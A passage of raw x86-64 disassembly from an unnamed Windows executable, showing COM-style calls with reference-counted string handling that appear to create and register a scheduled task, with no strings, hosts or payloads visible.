   1400025a4:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1400025a9:	48 85 c0             	test   %rax,%rax
   1400025ac:	74 32                	je     0x1400025e0
   1400025ae:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400025b1:	33 c0                	xor    %eax,%eax
   1400025b3:	0f 11 03             	movups %xmm0,(%rbx)
   1400025b6:	48 89 43 10          	mov    %rax,0x10(%rbx)
   1400025ba:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   1400025be:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%rbx)
   1400025c5:	48 8d 0d a8 75 00 00 	lea    0x75a8(%rip),%rcx        # 0x140009b74
   1400025cc:	ff 15 c6 6c 00 00    	call   *0x6cc6(%rip)        # 0x140009298
   1400025d2:	48 89 03             	mov    %rax,(%rbx)
   1400025d5:	48 85 c0             	test   %rax,%rax
   1400025d8:	0f 84 87 07 00 00    	je     0x140002d65
   1400025de:	eb 03                	jmp    0x1400025e3
   1400025e0:	49 8b de             	mov    %r14,%rbx
   1400025e3:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   1400025e8:	48 85 db             	test   %rbx,%rbx
   1400025eb:	0f 84 b6 07 00 00    	je     0x140002da7
   1400025f1:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   1400025f5:	48 8b 01             	mov    (%rcx),%rax
   1400025f8:	4c 8d 45 70          	lea    0x70(%rbp),%r8
   1400025fc:	48 8b 13             	mov    (%rbx),%rdx
   1400025ff:	ff 50 38             	call   *0x38(%rax)
   140002602:	8b f0                	mov    %eax,%esi
   140002604:	8b cf                	mov    %edi,%ecx
   140002606:	f0 0f c1 4b 10       	lock xadd %ecx,0x10(%rbx)
   14000260b:	83 f9 01             	cmp    $0x1,%ecx
   14000260e:	75 30                	jne    0x140002640
   140002610:	48 8b 0b             	mov    (%rbx),%rcx
   140002613:	48 85 c9             	test   %rcx,%rcx
   140002616:	74 09                	je     0x140002621
   140002618:	ff 15 82 6c 00 00    	call   *0x6c82(%rip)        # 0x1400092a0
   14000261e:	4c 89 33             	mov    %r14,(%rbx)
   140002621:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140002625:	48 85 c9             	test   %rcx,%rcx
   140002628:	74 09                	je     0x140002633
   14000262a:	e8 f1 46 00 00       	call   0x140006d20
   14000262f:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   140002633:	ba 18 00 00 00       	mov    $0x18,%edx
   140002638:	48 8b cb             	mov    %rbx,%rcx
   14000263b:	e8 e0 46 00 00       	call   0x140006d20
   140002640:	85 f6                	test   %esi,%esi
   140002642:	0f 88 fb 06 00 00    	js     0x140002d43
   140002648:	b9 18 00 00 00       	mov    $0x18,%ecx
   14000264d:	e8 d6 46 00 00       	call   0x140006d28
   140002652:	48 8b d8             	mov    %rax,%rbx
   140002655:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   14000265a:	48 85 c0             	test   %rax,%rax
   14000265d:	74 32                	je     0x140002691
   14000265f:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002662:	33 c0                	xor    %eax,%eax
   140002664:	0f 11 03             	movups %xmm0,(%rbx)
   140002667:	48 89 43 10          	mov    %rax,0x10(%rbx)
   14000266b:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   14000266f:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%rbx)
   140002676:	48 8d 0d fb 74 00 00 	lea    0x74fb(%rip),%rcx        # 0x140009b78
   14000267d:	ff 15 15 6c 00 00    	call   *0x6c15(%rip)        # 0x140009298
   140002683:	48 89 03             	mov    %rax,(%rbx)
   140002686:	48 85 c0             	test   %rax,%rax
   140002689:	0f 84 e1 06 00 00    	je     0x140002d70
   14000268f:	eb 03                	jmp    0x140002694
   140002691:	49 8b de             	mov    %r14,%rbx
   140002694:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140002699:	48 85 db             	test   %rbx,%rbx
   14000269c:	0f 84 05 07 00 00    	je     0x140002da7
   1400026a2:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   1400026a6:	48 8b 01             	mov    (%rcx),%rax
   1400026a9:	45 33 c0             	xor    %r8d,%r8d
   1400026ac:	48 8b 13             	mov    (%rbx),%rdx
   1400026af:	ff 50 78             	call   *0x78(%rax)
   1400026b2:	90                   	nop
   1400026b3:	8b c7                	mov    %edi,%eax
   1400026b5:	f0 0f c1 43 10       	lock xadd %eax,0x10(%rbx)
   1400026ba:	83 f8 01             	cmp    $0x1,%eax
   1400026bd:	75 30                	jne    0x1400026ef
   1400026bf:	48 8b 0b             	mov    (%rbx),%rcx
   1400026c2:	48 85 c9             	test   %rcx,%rcx
   1400026c5:	74 09                	je     0x1400026d0
   1400026c7:	ff 15 d3 6b 00 00    	call   *0x6bd3(%rip)        # 0x1400092a0
   1400026cd:	4c 89 33             	mov    %r14,(%rbx)
   1400026d0:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   1400026d4:	48 85 c9             	test   %rcx,%rcx
   1400026d7:	74 09                	je     0x1400026e2
   1400026d9:	e8 42 46 00 00       	call   0x140006d20
   1400026de:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   1400026e2:	ba 18 00 00 00       	mov    $0x18,%edx
   1400026e7:	48 8b cb             	mov    %rbx,%rcx
   1400026ea:	e8 31 46 00 00       	call   0x140006d20
   1400026ef:	4c 89 75 60          	mov    %r14,0x60(%rbp)
   1400026f3:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   1400026f7:	48 8b 01             	mov    (%rcx),%rax
   1400026fa:	4c 8d 45 60          	lea    0x60(%rbp),%r8
   1400026fe:	33 d2                	xor    %edx,%edx
   140002700:	ff 50 48             	call   *0x48(%rax)
   140002703:	8b d8                	mov    %eax,%ebx
   140002705:	85 c0                	test   %eax,%eax
   140002707:	79 48                	jns    0x140002751
   140002709:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   14000270d:	48 8b 11             	mov    (%rcx),%rdx
   140002710:	ff 52 10             	call   *0x10(%rdx)
   140002713:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   140002717:	48 8b 11             	mov    (%rcx),%rdx
   14000271a:	ff 52 10             	call   *0x10(%rdx)
   14000271d:	ff 15 e5 6e 00 00    	call   *0x6ee5(%rip)        # 0x140009608
   140002723:	8b c3                	mov    %ebx,%eax
   140002725:	48 8b 8d c0 00 00 00 	mov    0xc0(%rbp),%rcx
   14000272c:	48 33 cc             	xor    %rsp,%rcx
   14000272f:	e8 cc 45 00 00       	call   0x140006d00
   140002734:	4c 8d 9c 24 d0 01 00 	lea    0x1d0(%rsp),%r11
   14000273b:	00 
   14000273c:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140002740:	49 8b 73 18          	mov    0x18(%r11),%rsi
   140002744:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   140002748:	4d 8b 73 28          	mov    0x28(%r11),%r14
   14000274c:	49 8b e3             	mov    %r11,%rsp
   14000274f:	5d                   	pop    %rbp
   140002750:	c3                   	ret
   140002751:	4c 89 b5 88 00 00 00 	mov    %r14,0x88(%rbp)
   140002758:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   14000275c:	48 8b 01             	mov    (%rcx),%rax
   14000275f:	48 8d 95 88 00 00 00 	lea    0x88(%rbp),%rdx
   140002766:	ff 50 38             	call   *0x38(%rax)
   140002769:	85 c0                	test   %eax,%eax
   14000276b:	0f 88 5b 01 00 00    	js     0x1400028cc
   140002771:	b9 18 00 00 00       	mov    $0x18,%ecx
   140002776:	e8 ad 45 00 00       	call   0x140006d28
   14000277b:	48 8b d8             	mov    %rax,%rbx
   14000277e:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140002783:	48 85 c0             	test   %rax,%rax
   140002786:	74 32                	je     0x1400027ba
   140002788:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000278b:	33 c0                	xor    %eax,%eax
   14000278d:	0f 11 03             	movups %xmm0,(%rbx)
   140002790:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140002794:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   140002798:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%rbx)
   14000279f:	48 8d 0d ea 73 00 00 	lea    0x73ea(%rip),%rcx        # 0x140009b90
   1400027a6:	ff 15 ec 6a 00 00    	call   *0x6aec(%rip)        # 0x140009298
   1400027ac:	48 89 03             	mov    %rax,(%rbx)
   1400027af:	48 85 c0             	test   %rax,%rax
   1400027b2:	0f 84 c3 05 00 00    	je     0x140002d7b
   1400027b8:	eb 03                	jmp    0x1400027bd
   1400027ba:	49 8b de             	mov    %r14,%rbx
   1400027bd:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   1400027c2:	48 85 db             	test   %rbx,%rbx
   1400027c5:	0f 84 dc 05 00 00    	je     0x140002da7
   1400027cb:	48 8b 8d 88 00 00 00 	mov    0x88(%rbp),%rcx
   1400027d2:	48 8b 01             	mov    (%rcx),%rax
   1400027d5:	48 8b 13             	mov    (%rbx),%rdx
   1400027d8:	ff 50 50             	call   *0x50(%rax)
   1400027db:	90                   	nop
   1400027dc:	8b c7                	mov    %edi,%eax
   1400027de:	f0 0f c1 43 10       	lock xadd %eax,0x10(%rbx)
   1400027e3:	83 f8 01             	cmp    $0x1,%eax
   1400027e6:	75 30                	jne    0x140002818
   1400027e8:	48 8b 0b             	mov    (%rbx),%rcx
   1400027eb:	48 85 c9             	test   %rcx,%rcx
   1400027ee:	74 09                	je     0x1400027f9
   1400027f0:	ff 15 aa 6a 00 00    	call   *0x6aaa(%rip)        # 0x1400092a0
   1400027f6:	4c 89 33             	mov    %r14,(%rbx)
   1400027f9:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   1400027fd:	48 85 c9             	test   %rcx,%rcx
   140002800:	74 09                	je     0x14000280b
   140002802:	e8 19 45 00 00       	call   0x140006d20
   140002807:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   14000280b:	ba 18 00 00 00       	mov    $0x18,%edx
   140002810:	48 8b cb             	mov    %rbx,%rcx
   140002813:	e8 08 45 00 00       	call   0x140006d20
   140002818:	b9 18 00 00 00       	mov    $0x18,%ecx
   14000281d:	e8 06 45 00 00       	call   0x140006d28
   140002822:	48 8b d8             	mov    %rax,%rbx
   140002825:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   14000282a:	48 85 c0             	test   %rax,%rax
   14000282d:	74 32                	je     0x140002861
   14000282f:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002832:	33 c0                	xor    %eax,%eax
   140002834:	0f 11 03             	movups %xmm0,(%rbx)
   140002837:	48 89 43 10          	mov    %rax,0x10(%rbx)
   14000283b:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   14000283f:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%rbx)
   140002846:	48 8d 0d 73 73 00 00 	lea    0x7373(%rip),%rcx        # 0x140009bc0
   14000284d:	ff 15 45 6a 00 00    	call   *0x6a45(%rip)        # 0x140009298
   140002853:	48 89 03             	mov    %rax,(%rbx)
   140002856:	48 85 c0             	test   %rax,%rax
   140002859:	0f 84 27 05 00 00    	je     0x140002d86
   14000285f:	eb 03                	jmp    0x140002864
   140002861:	49 8b de             	mov    %r14,%rbx
   140002864:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140002869:	48 85 db             	test   %rbx,%rbx
   14000286c:	0f 84 35 05 00 00    	je     0x140002da7
   140002872:	48 8b 8d 88 00 00 00 	mov    0x88(%rbp),%rcx
   140002879:	48 8b 01             	mov    (%rcx),%rax
   14000287c:	48 8b 13             	mov    (%rbx),%rdx
   14000287f:	ff 50 40             	call   *0x40(%rax)
   140002882:	90                   	nop
   140002883:	8b c7                	mov    %edi,%eax
   140002885:	f0 0f c1 43 10       	lock xadd %eax,0x10(%rbx)
   14000288a:	83 f8 01             	cmp    $0x1,%eax
   14000288d:	75 30                	jne    0x1400028bf
   14000288f:	48 8b 0b             	mov    (%rbx),%rcx
   140002892:	48 85 c9             	test   %rcx,%rcx
   140002895:	74 09                	je     0x1400028a0
   140002897:	ff 15 03 6a 00 00    	call   *0x6a03(%rip)        # 0x1400092a0
   14000289d:	4c 89 33             	mov    %r14,(%rbx)
   1400028a0:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   1400028a4:	48 85 c9             	test   %rcx,%rcx
   1400028a7:	74 09                	je     0x1400028b2
   1400028a9:	e8 72 44 00 00       	call   0x140006d20
   1400028ae:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   1400028b2:	ba 18 00 00 00       	mov    $0x18,%edx
   1400028b7:	48 8b cb             	mov    %rbx,%rcx
   1400028ba:	e8 61 44 00 00       	call   0x140006d20
   1400028bf:	48 8b 8d 88 00 00 00 	mov    0x88(%rbp),%rcx
   1400028c6:	48 8b 01             	mov    (%rcx),%rax
   1400028c9:	ff 50 10             	call   *0x10(%rax)
   1400028cc:	4c 89 b5 a0 00 00 00 	mov    %r14,0xa0(%rbp)
   1400028d3:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   1400028d7:	48 8b 01             	mov    (%rcx),%rax
   1400028da:	48 8d 95 a0 00 00 00 	lea    0xa0(%rbp),%rdx
   1400028e1:	ff 50 48             	call   *0x48(%rax)
   1400028e4:	8b d8                	mov    %eax,%ebx
   1400028e6:	85 c0                	test   %eax,%eax
   1400028e8:	79 23                	jns    0x14000290d
   1400028ea:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   1400028ee:	48 8b 11             	mov    (%rcx),%rdx
   1400028f1:	ff 52 10             	call   *0x10(%rdx)
   1400028f4:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   1400028f8:	48 8b 11             	mov    (%rcx),%rdx
   1400028fb:	ff 52 10             	call   *0x10(%rdx)
   1400028fe:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   140002902:	48 8b 01             	mov    (%rcx),%rax
   140002905:	ff 50 10             	call   *0x10(%rax)
   140002908:	e9 10 fe ff ff       	jmp    0x14000271d
   14000290d:	4c 89 b5 b0 00 00 00 	mov    %r14,0xb0(%rbp)
   140002914:	48 8b 8d a0 00 00 00 	mov    0xa0(%rbp),%rcx
   14000291b:	48 8b 01             	mov    (%rcx),%rax
   14000291e:	4c 8d 85 b0 00 00 00 	lea    0xb0(%rbp),%r8
   140002925:	ba 09 00 00 00       	mov    $0x9,%edx
   14000292a:	ff 50 50             	call   *0x50(%rax)
   14000292d:	8b d8                	mov    %eax,%ebx
   14000292f:	48 8b 8d a0 00 00 00 	mov    0xa0(%rbp),%rcx
   140002936:	48 8b 11             	mov    (%rcx),%rdx
   140002939:	ff 52 10             	call   *0x10(%rdx)
   14000293c:	85 db                	test   %ebx,%ebx
   14000293e:	78 52                	js     0x140002992
   140002940:	48 8b 8d b0 00 00 00 	mov    0xb0(%rbp),%rcx
   140002947:	48 8b 01             	mov    (%rcx),%rax
   14000294a:	ff 50 10             	call   *0x10(%rax)
   14000294d:	4c 89 75 78          	mov    %r14,0x78(%rbp)
   140002951:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   140002955:	48 8b 01             	mov    (%rcx),%rax
   140002958:	48 8d 55 78          	lea    0x78(%rbp),%rdx
   14000295c:	ff 90 88 00 00 00    	call   *0x88(%rax)
   140002962:	8b d8                	mov    %eax,%ebx
   140002964:	85 c0                	test   %eax,%eax
   140002966:	78 82                	js     0x1400028ea
   140002968:	4c 89 b5 80 00 00 00 	mov    %r14,0x80(%rbp)
   14000296f:	48 8b 4d 78          	mov    0x78(%rbp),%rcx
   140002973:	48 8b 01             	mov    (%rcx),%rax
   140002976:	4c 8d 85 80 00 00 00 	lea    0x80(%rbp),%r8
   14000297d:	33 d2                	xor    %edx,%edx
   14000297f:	ff 50 60             	call   *0x60(%rax)
   140002982:	8b d8                	mov    %eax,%ebx
   140002984:	85 c0                	test   %eax,%eax
   140002986:	79 2d                	jns    0x1400029b5
   140002988:	48 8b 4d 78          	mov    0x78(%rbp),%rcx
   14000298c:	48 8b 11             	mov    (%rcx),%rdx
   14000298f:	ff 52 10             	call   *0x10(%rdx)
   140002992:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   140002996:	48 8b 11             	mov    (%rcx),%rdx
   140002999:	ff 52 10             	call   *0x10(%rdx)
   14000299c:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   1400029a0:	48 8b 01             	mov    (%rcx),%rax
   1400029a3:	ff 50 10             	call   *0x10(%rax)
   1400029a6:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   1400029aa:	48 8b 01             	mov    (%rcx),%rax
   1400029ad:	ff 50 10             	call   *0x10(%rax)
   1400029b0:	e9 68 fd ff ff       	jmp    0x14000271d
   1400029b5:	4c 89 b5 90 00 00 00 	mov    %r14,0x90(%rbp)
   1400029bc:	48 8b 8d 80 00 00 00 	mov    0x80(%rbp),%rcx
   1400029c3:	48 8b 01             	mov    (%rcx),%rax
   1400029c6:	4c 8d 85 90 00 00 00 	lea    0x90(%rbp),%r8
   1400029cd:	48 8d 15 34 6d 00 00 	lea    0x6d34(%rip),%rdx        # 0x140009708
   1400029d4:	ff 10                	call   *(%rax)
   1400029d6:	8b d8                	mov    %eax,%ebx
   1400029d8:	85 c0                	test   %eax,%eax
   1400029da:	79 3a                	jns    0x140002a16
   1400029dc:	48 8b 8d 80 00 00 00 	mov    0x80(%rbp),%rcx
   1400029e3:	48 8b 11             	mov    (%rcx),%rdx
   1400029e6:	ff 52 10             	call   *0x10(%rdx)
   1400029e9:	48 8b 4d 78          	mov    0x78(%rbp),%rcx
   1400029ed:	48 8b 11             	mov    (%rcx),%rdx
   1400029f0:	ff 52 10             	call   *0x10(%rdx)
   1400029f3:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   1400029f7:	48 8b 01             	mov    (%rcx),%rax
   1400029fa:	ff 50 10             	call   *0x10(%rax)
   1400029fd:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   140002a01:	48 8b 01             	mov    (%rcx),%rax
   140002a04:	ff 50 10             	call   *0x10(%rax)
   140002a07:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   140002a0b:	48 8b 01             	mov    (%rcx),%rax
   140002a0e:	ff 50 10             	call   *0x10(%rax)
   140002a11:	e9 07 fd ff ff       	jmp    0x14000271d
   140002a16:	b9 18 00 00 00       	mov    $0x18,%ecx
   140002a1b:	e8 08 43 00 00       	call   0x140006d28
   140002a20:	48 8b d8             	mov    %rax,%rbx
   140002a23:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140002a28:	48 85 c0             	test   %rax,%rax
   140002a2b:	74 32                	je     0x140002a5f
   140002a2d:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002a30:	33 c0                	xor    %eax,%eax
   140002a32:	0f 11 03             	movups %xmm0,(%rbx)
   140002a35:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140002a39:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   140002a3d:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%rbx)
   140002a44:	48 8d 0d a5 71 00 00 	lea    0x71a5(%rip),%rcx        # 0x140009bf0
   140002a4b:	ff 15 47 68 00 00    	call   *0x6847(%rip)        # 0x140009298
   140002a51:	48 89 03             	mov    %rax,(%rbx)
   140002a54:	48 85 c0             	test   %rax,%rax
   140002a57:	0f 84 34 03 00 00    	je     0x140002d91
   140002a5d:	eb 03                	jmp    0x140002a62
   140002a5f:	49 8b de             	mov    %r14,%rbx
   140002a62:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140002a67:	48 85 db             	test   %rbx,%rbx
   140002a6a:	0f 84 37 03 00 00    	je     0x140002da7
   140002a70:	48 8b 8d 90 00 00 00 	mov    0x90(%rbp),%rcx
   140002a77:	48 8b 01             	mov    (%rcx),%rax
   140002a7a:	48 8b 13             	mov    (%rbx),%rdx
   140002a7d:	ff 50 58             	call   *0x58(%rax)
   140002a80:	8b f0                	mov    %eax,%esi
   140002a82:	8b cf                	mov    %edi,%ecx
   140002a84:	f0 0f c1 4b 10       	lock xadd %ecx,0x10(%rbx)
   140002a89:	83 f9 01             	cmp    $0x1,%ecx
   140002a8c:	75 30                	jne    0x140002abe
   140002a8e:	48 8b 0b             	mov    (%rbx),%rcx
   140002a91:	48 85 c9             	test   %rcx,%rcx
   140002a94:	74 09                	je     0x140002a9f
   140002a96:	ff 15 04 68 00 00    	call   *0x6804(%rip)        # 0x1400092a0
   140002a9c:	4c 89 33             	mov    %r14,(%rbx)
   140002a9f:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140002aa3:	48 85 c9             	test   %rcx,%rcx
   140002aa6:	74 09                	je     0x140002ab1
   140002aa8:	e8 73 42 00 00       	call   0x140006d20
   140002aad:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   140002ab1:	ba 18 00 00 00       	mov    $0x18,%edx
   140002ab6:	48 8b cb             	mov    %rbx,%rcx
   140002ab9:	e8 62 42 00 00       	call   0x140006d20
   140002abe:	48 8b 8d 90 00 00 00 	mov    0x90(%rbp),%rcx
   140002ac5:	48 8b 01             	mov    (%rcx),%rax
   140002ac8:	ff 50 10             	call   *0x10(%rax)
   140002acb:	48 8b 8d 80 00 00 00 	mov    0x80(%rbp),%rcx
   140002ad2:	48 8b 01             	mov    (%rcx),%rax
   140002ad5:	ff 50 10             	call   *0x10(%rax)
   140002ad8:	48 8b 4d 78          	mov    0x78(%rbp),%rcx
   140002adc:	48 8b 01             	mov    (%rcx),%rax
   140002adf:	ff 50 10             	call   *0x10(%rax)
   140002ae2:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   140002ae6:	85 f6                	test   %esi,%esi
   140002ae8:	0f 88 45 02 00 00    	js     0x140002d33
   140002aee:	4c 89 b5 98 00 00 00 	mov    %r14,0x98(%rbp)
   140002af5:	48 8b 01             	mov    (%rcx),%rax
   140002af8:	48 8d 95 98 00 00 00 	lea    0x98(%rbp),%rdx
   140002aff:	ff 50 58             	call   *0x58(%rax)
   140002b02:	4c 89 b5 a8 00 00 00 	mov    %r14,0xa8(%rbp)
   140002b09:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   140002b0d:	48 8b 01             	mov    (%rcx),%rax
   140002b10:	48 8d 95 a8 00 00 00 	lea    0xa8(%rbp),%rdx
   140002b17:	ff 50 78             	call   *0x78(%rax)
   140002b1a:	85 c0                	test   %eax,%eax
   140002b1c:	78 5e                	js     0x140002b7c
   140002b1e:	48 8b 8d a8 00 00 00 	mov    0xa8(%rbp),%rcx
   140002b25:	48 85 c9             	test   %rcx,%rcx
   140002b28:	74 21                	je     0x140002b4b
   140002b2a:	48 8b 01             	mov    (%rcx),%rax
   140002b2d:	ba 01 00 00 00       	mov    $0x1,%edx
   140002b32:	ff 90 90 00 00 00    	call   *0x90(%rax)
   140002b38:	8b d8                	mov    %eax,%ebx
   140002b3a:	48 8b 8d a8 00 00 00 	mov    0xa8(%rbp),%rcx
   140002b41:	48 8b 11             	mov    (%rcx),%rdx
   140002b44:	ff 52 10             	call   *0x10(%rdx)
   140002b47:	85 db                	test   %ebx,%ebx
   140002b49:	78 31                	js     0x140002b7c
   140002b4b:	8b d7                	mov    %edi,%edx
   140002b4d:	48 8b 8d 98 00 00 00 	mov    0x98(%rbp),%rcx
   140002b54:	48 8b 01             	mov    (%rcx),%rax
   140002b57:	ff 90 b0 00 00 00    	call   *0xb0(%rax)
   140002b5d:	33 d2                	xor    %edx,%edx
   140002b5f:	48 8b 8d 98 00 00 00 	mov    0x98(%rbp),%rcx
   140002b66:	48 8b 01             	mov    (%rcx),%rax
   140002b69:	ff 90 30 01 00 00    	call   *0x130(%rax)
   140002b6f:	48 8b 8d 98 00 00 00 	mov    0x98(%rbp),%rcx
   140002b76:	48 8b 01             	mov    (%rcx),%rax
   140002b79:	ff 50 10             	call   *0x10(%rax)
   140002b7c:	4c 89 b5 b8 00 00 00 	mov    %r14,0xb8(%rbp)
   140002b83:	b8 08 00 00 00       	mov    $0x8,%eax
   140002b88:	66 89 44 24 70       	mov    %ax,0x70(%rsp)
   140002b8d:	48 8d 0d a4 70 00 00 	lea    0x70a4(%rip),%rcx        # 0x140009c38
   140002b94:	ff 15 fe 66 00 00    	call   *0x66fe(%rip)        # 0x140009298
   140002b9a:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   140002b9f:	48 85 c0             	test   %rax,%rax
   140002ba2:	0f 84 0a 02 00 00    	je     0x140002db2
   140002ba8:	0f 10 44 24 70       	movups 0x70(%rsp),%xmm0
   140002bad:	0f 11 45 e0          	movups %xmm0,-0x20(%rbp)
   140002bb1:	f2 0f 10 45 80       	movsd  -0x80(%rbp),%xmm0
   140002bb6:	f2 0f 11 44 24 50    	movsd  %xmm0,0x50(%rsp)
   140002bbc:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   140002bc0:	ff 15 e2 66 00 00    	call   *0x66e2(%rip)        # 0x1400092a8
   140002bc6:	90                   	nop
   140002bc7:	0f 10 45 90          	movups -0x70(%rbp),%xmm0
   140002bcb:	0f 11 45 c0          	movups %xmm0,-0x40(%rbp)
   140002bcf:	f2 0f 10 45 a0       	movsd  -0x60(%rbp),%xmm0
   140002bd4:	f2 0f 11 44 24 60    	movsd  %xmm0,0x60(%rsp)
   140002bda:	48 8d 4d a8          	lea    -0x58(%rbp),%rcx
   140002bde:	ff 15 c4 66 00 00    	call   *0x66c4(%rip)        # 0x1400092a8
   140002be4:	90                   	nop
   140002be5:	0f 10 45 e0          	movups -0x20(%rbp),%xmm0
   140002be9:	0f 29 45 40          	movaps %xmm0,0x40(%rbp)
   140002bed:	f2 0f 10 44 24 50    	movsd  0x50(%rsp),%xmm0
   140002bf3:	f2 0f 11 45 50       	movsd  %xmm0,0x50(%rbp)
   140002bf8:	0f 10 45 c0          	movups -0x40(%rbp),%xmm0
   140002bfc:	0f 29 45 20          	movaps %xmm0,0x20(%rbp)
   140002c00:	f2 0f 10 44 24 60    	movsd  0x60(%rsp),%xmm0
   140002c06:	f2 0f 11 45 30       	movsd  %xmm0,0x30(%rbp)
   140002c0b:	0f 10 45 a8          	movups -0x58(%rbp),%xmm0
   140002c0f:	0f 29 45 00          	movaps %xmm0,0x0(%rbp)
   140002c13:	f2 0f 10 4d b8       	movsd  -0x48(%rbp),%xmm1
   140002c18:	f2 0f 11 4d 10       	movsd  %xmm1,0x10(%rbp)
   140002c1d:	b9 18 00 00 00       	mov    $0x18,%ecx
   140002c22:	e8 01 41 00 00       	call   0x140006d28
   140002c27:	48 8b d8             	mov    %rax,%rbx
   140002c2a:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140002c2f:	48 85 c0             	test   %rax,%rax
   140002c32:	74 32                	je     0x140002c66
   140002c34:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002c37:	33 c0                	xor    %eax,%eax
   140002c39:	0f 11 03             	movups %xmm0,(%rbx)
   140002c3c:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140002c40:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   140002c44:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%rbx)
   140002c4b:	48 8d 0d 26 6f 00 00 	lea    0x6f26(%rip),%rcx        # 0x140009b78
   140002c52:	ff 15 40 66 00 00    	call   *0x6640(%rip)        # 0x140009298
   140002c58:	48 89 03             	mov    %rax,(%rbx)
   140002c5b:	48 85 c0             	test   %rax,%rax
   140002c5e:	0f 84 38 01 00 00    	je     0x140002d9c
   140002c64:	eb 03                	jmp    0x140002c69
   140002c66:	49 8b de             	mov    %r14,%rbx
   140002c69:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140002c6e:	48 85 db             	test   %rbx,%rbx
   140002c71:	0f 84 e3 00 00 00    	je     0x140002d5a
   140002c77:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   140002c7b:	48 8b 01             	mov    (%rcx),%rax
   140002c7e:	48 8d 95 b8 00 00 00 	lea    0xb8(%rbp),%rdx
   140002c85:	48 89 54 24 40       	mov    %rdx,0x40(%rsp)
   140002c8a:	48 8d 55 40          	lea    0x40(%rbp),%rdx
   140002c8e:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   140002c93:	c7 44 24 30 03 00 00 	movl   $0x3,0x30(%rsp)
   140002c9a:	00 
   140002c9b:	48 8d 55 20          	lea    0x20(%rbp),%rdx
   140002c9f:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
   140002ca4:	48 8d 55 00          	lea    0x0(%rbp),%rdx
   140002ca8:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140002cad:	41 b9 06 00 00 00    	mov    $0x6,%r9d
   140002cb3:	4c 8b 45 60          	mov    0x60(%rbp),%r8
   140002cb7:	48 8b 13             	mov    (%rbx),%rdx
   140002cba:	ff 90 88 00 00 00    	call   *0x88(%rax)
   140002cc0:	8b f0                	mov    %eax,%esi
   140002cc2:	f0 0f c1 7b 10       	lock xadd %edi,0x10(%rbx)
   140002cc7:	83 ff 01             	cmp    $0x1,%edi
   140002cca:	75 31                	jne    0x140002cfd
   140002ccc:	48 8b 0b             	mov    (%rbx),%rcx
   140002ccf:	48 85 c9             	test   %rcx,%rcx
   140002cd2:	74 09                	je     0x140002cdd
   140002cd4:	ff 15 c6 65 00 00    	call   *0x65c6(%rip)        # 0x1400092a0
   140002cda:	4c 89 33             	mov    %r14,(%rbx)
   140002cdd:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140002ce1:	48 85 c9             	test   %rcx,%rcx
   140002ce4:	74 09                	je     0x140002cef
   140002ce6:	e8 35 40 00 00       	call   0x140006d20
   140002ceb:	4c 89 73 08          	mov    %r14,0x8(%rbx)
